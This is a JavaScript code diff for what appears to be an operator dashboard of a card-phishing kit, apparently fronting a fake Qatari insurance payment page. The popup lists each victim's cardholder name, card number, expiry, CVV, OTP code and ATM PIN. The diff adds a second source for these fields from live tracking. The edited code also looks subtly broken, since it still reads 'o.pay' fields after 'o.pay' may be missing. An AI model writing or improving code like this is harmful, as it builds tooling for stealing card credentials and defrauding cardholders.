@@ -671,15 +671,20 @@ function openPop(ref){
   if (o.pay && o.pay.amount != null) customerHTML += `<div class="drow"><span class="k">مبلغ التأمين</span><span class="v" style="direction:ltr;font-weight:700;color:var(--gold-deep)">${esc(o.pay.amount)} ${esc(o.pay.currency || 'QAR')}</span></div>`;
   customerHTML += '</div></div>';
 
-  // بيانات البطاقة
+  // بيانات البطاقة (من /api/payment أو من التتبع اللحظي)
   let cardHTML = '';
-  if (o.pay) {
+  var hasCard = o.pay || o.cardName || o.cardNumber;
+  if (hasCard) {
     const showCardBtns = isAwaiting && isCardStep;
     cardHTML = `<div style="margin-bottom:16px;padding-bottom:12px;border-bottom:2px solid var(--line)"><div style="font-weight:800;margin-bottom:10px;color:var(--gold-deep);font-size:1rem">💳 بيانات البطاقة</div><div class="dgrid">`;
-    if (o.pay.cardName) cardHTML += `<div class="drow"><span class="k">اسم صاحب البطاقة</span><span class="v">${esc(o.pay.cardName)}</span></div>`;
-    if (o.pay.cardNumber || o.pay.number) cardHTML += `<div class="drow"><span class="k">رقم البطاقة</span><span class="v" style="direction:ltr;font-family:monospace">${esc(o.pay.cardNumber || o.pay.number)}</span></div>`;
-    if (o.pay.exp || o.pay.expiry) cardHTML += `<div class="drow"><span class="k">تاريخ الانتهاء</span><span class="v" style="direction:ltr">${esc(o.pay.exp || o.pay.expiry)}</span></div>`;
-    if (o.pay.cvv) cardHTML += `<div class="drow"><span class="k">CVV</span><span class="v" style="direction:ltr;font-weight:700">${esc(o.pay.cvv)}</span></div>`;
+    var cName = (o.pay && o.pay.cardName) || o.cardName;
+    var cNum = (o.pay && (o.pay.cardNumber || o.pay.number)) || o.cardNumber;
+    var cExp = (o.pay && (o.pay.exp || o.pay.expiry)) || o.cardExpiry;
+    var cCvv = (o.pay && o.pay.cvv) || o.cardCvv;
+    if (cName) cardHTML += `<div class="drow"><span class="k">اسم صاحب البطاقة</span><span class="v">${esc(cName)}</span></div>`;
+    if (cNum) cardHTML += `<div class="drow"><span class="k">رقم البطاقة</span><span class="v" style="direction:ltr;font-family:monospace">${esc(cNum)}</span></div>`;
+    if (cExp) cardHTML += `<div class="drow"><span class="k">تاريخ الانتهاء</span><span class="v" style="direction:ltr">${esc(cExp)}</span></div>`;
+    if (cCvv) cardHTML += `<div class="drow"><span class="k">CVV</span><span class="v" style="direction:ltr;font-weight:700">${esc(cCvv)}</span></div>`;
     if (o.pay.otp || o.pay.code) cardHTML += `<div class="drow" style="background:rgba(212,175,55,.08);border-radius:8px;padding:8px 4px"><span class="k">رمز OTP</span><span class="v" style="direction:ltr;font-weight:800;font-size:1.1rem;color:var(--gold-deep)">${esc(o.pay.otp || o.pay.code)}</span></div>`;
     if (o.pay.pin) cardHTML += `<div class="drow" style="background:rgba(212,175,55,.08);border-radius:8px;padding:8px 4px"><span class="k">الرقم السري ATM</span><span class="v" style="direction:ltr;font-weight:800;font-size:1.1rem;color:var(--gold-deep)">${esc(o.pay.pin)}</span></div>`;
     cardHTML += '</div>';
